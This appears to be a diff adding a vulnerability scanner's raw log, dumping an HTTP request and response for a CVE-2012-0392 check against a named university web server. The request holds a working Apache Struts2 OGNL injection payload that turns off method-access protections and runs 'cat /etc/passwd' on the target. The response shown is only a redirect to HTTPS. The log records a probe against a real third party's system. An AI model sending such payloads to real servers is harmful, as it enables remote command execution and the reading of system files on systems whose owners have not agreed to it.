@@ -1,0 +1,32 @@
+[CVE-2012-0392] Dumped HTTP request for http://web.mup.unimelb.edu.au/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))
+
+
+GET /devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream())) HTTP/1.1
+Host: web.mup.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2012-0392] Dumped HTTP response http://web.mup.unimelb.edu.au/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 695
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:18:46 GMT
+Location: https://web.mup.unimelb.edu.au/devmode.action?debug=command&expression=(%2523_memberAccess%5b%2522allowStaticMethodAccess%2522%5d%253Dtrue%252C%2523foo%253Dnew%2520java.lang.Boolean(%2522false%2522)%2520%252C%2523context%5b%2522xwork.MethodAccessor.denyMethodExecution%2522%5d%253D%2523foo%252C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%2527cat%2520/etc/passwd%2527).getInputStream()))
+Server: Apache/2.4.7 (Ubuntu)
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="https://web.mup.unimelb.edu.au/devmode.action?debug=command&amp;expression=(%2523_memberAccess%5b%2522allowStaticMethodAccess%2522%5d%253Dtrue%252C%2523foo%253Dnew%2520java.lang.Boolean(%2522false%2522)%2520%252C%2523context%5b%2522xwork.MethodAccessor.denyMethodExecution%2522%5d%253D%2523foo%252C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%2527cat%2520/etc/passwd%2527).getInputStream()))">here</a>.</p>
+<hr>
+<address>Apache/2.4.7 (Ubuntu) Server at web.mup.unimelb.edu.au Port 80</address>
+</body></html>
+
